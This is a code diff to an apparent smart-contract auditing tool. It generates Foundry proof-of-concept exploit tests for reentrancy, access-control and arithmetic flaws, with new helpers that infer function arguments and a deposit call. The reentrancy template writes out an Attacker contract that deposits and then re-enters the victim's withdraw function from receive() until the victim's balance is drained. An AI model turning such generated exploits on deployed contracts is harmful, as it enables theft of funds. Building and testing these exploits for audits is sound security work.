@@ -437,6 +437,54 @@ def _ensure_forge_std(tmp: Path):
         test_sol.write_text(MOCK_FORGE_STD, encoding="utf-8")
 
 
+_DEPOSIT_LIKE = ("deposit", "mint", "stake", "fund", "supply", "add_liquidity", "addLiquidity")
+
+
+def _function_signature(source_code: str, func_name: str) -> tuple:
+    """Return (param_types, is_payable) for the first declaration of func_name."""
+    decl = re.search(rf"function\s+{re.escape(func_name)}\s*\(([^)]*)\)", source_code)
+    if not decl:
+        return [], False
+    body = decl.group(1).strip()
+    params = [p.strip().split()[0] for p in body.split(",") if p.strip()] if body else []
+    payable = bool(
+        re.search(rf"function\s+{re.escape(func_name)}\s*\(([^)]*)\)\s*(?:public|external|internal|private)?\s*payable", source_code)
+    )
+    return params, payable
+
+
+def _default_arg(param_type: str) -> str:
+    t = param_type.replace(" ", "").lower()
+    if t.startswith("uint") or t.startswith("int"):
+        return "1 ether"
+    if "address" in t:
+        return "address(this)"
+    if t == "bool":
+        return "true"
+    if t.startswith("bytes32"):
+        return "bytes32(0)"
+    if t.startswith("bytes") or t.startswith("string"):
+        return '""'
+    return '""'
+
+
+def _make_call(source_code: str, func_name: str, receiver: str) -> str:
+    params, _ = _function_signature(source_code, func_name)
+    args = ", ".join(_default_arg(p) for p in params)
+    return f"{receiver}.{func_name}({args});"
+
+
+def _funding_call(source_code: str, receiver: str) -> str:
+    for name in _DEPOSIT_LIKE:
+        params, payable = _function_signature(source_code, name)
+        if not params and payable:
+            return f"{receiver}.{name}{{value: 1 ether}}();"
+    return (
+        f"(bool ok,) = address({receiver}).call{{value: 1 ether}}(\"\");\n"
+        "        require(ok, \"transfer failed\");"
+    )
+
+
 def _generate_poc(source_code: str, scenario: AttackScenario, contract_name: str = "VulnerableVault") -> str:
     if scenario.attack_vector == "reentrancy":
         return _reentrancy_poc(source_code, scenario, contract_name)
@@ -464,6 +512,7 @@ contract PoC is Test {{
 
 def _access_control_poc(source_code: str, scenario: AttackScenario, contract_name: str) -> str:
     func_name = scenario.entry_point or "restricted"
+    call = _make_call(source_code, func_name, "victim")
     return f"""// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
@@ -474,17 +523,17 @@ contract PoC is Test {{
     function testExploit() public {{
         vm.startPrank(address(0x01));
         vm.expectRevert();
-        victim.{func_name}();
+        {call}
         vm.stopPrank();
 
         vm.startPrank(address(0xBAD));
-        victim.{func_name}();
+        {call}
         vm.stopPrank();
 
         // Verify no access gained — same caller should still be blocked
         vm.startPrank(address(0x01));
         vm.expectRevert();
-        victim.{func_name}();
+        {call}
         vm.stopPrank();
     }}
 }}
@@ -492,6 +541,8 @@ contract PoC is Test {{
 
 
 def _arithmetic_poc(source_code: str, scenario: AttackScenario, contract_name: str) -> str:
+    func_name = scenario.entry_point or "unsafe_func"
+    call = _make_call(source_code, func_name, "victim")
     return f"""// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
@@ -504,16 +555,16 @@ contract PoC is Test {{
     function testExploit() public {{
         vm.startPrank(address(0xBAD));
         vm.expectRevert();
-        victim.{scenario.entry_point or "unsafe_func"}();
+        {call}
         vm.stopPrank();
 
         vm.startPrank(address(0x01));
-        victim.{scenario.entry_point or "unsafe_func"}();
+        {call}
         vm.stopPrank();
 
         vm.startPrank(address(0xBAD));
         vm.expectRevert();
-        victim.{scenario.entry_point or "unsafe_func"}();
+        {call}
         vm.stopPrank();
     }}
 }}
@@ -522,6 +573,8 @@ contract PoC is Test {{
 
 def _reentrancy_poc(source_code: str, scenario: AttackScenario, contract_name: str) -> str:
     entry_point = scenario.entry_point or "withdraw"
+    entry_call = _make_call(source_code, entry_point, "victim")
+    funding = _funding_call(source_code, "victim")
     return f"""// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -558,17 +611,16 @@ contract Attacker {{
     }}
 
     function depositAndAttack() external payable {{
-        // Transfer ETH to victim so it has a balance to drain
-        (bool ok,) = address(victim).call{{value: 1 ether}}("");
-        require(ok, "transfer failed");
+        // Fund the attacker's recorded balance via the victim's deposit path
+        {funding}
         // Then trigger {entry_point} - reentrancy in receive() drains the victim
-        victim.{entry_point}();
+        {entry_call}
     }}
 
     receive() external payable {{
         if (count < 5 && address(victim).balance > 0) {{
             count++;
-            victim.{entry_point}();
+            {entry_call}
         }}
     }}
 }}
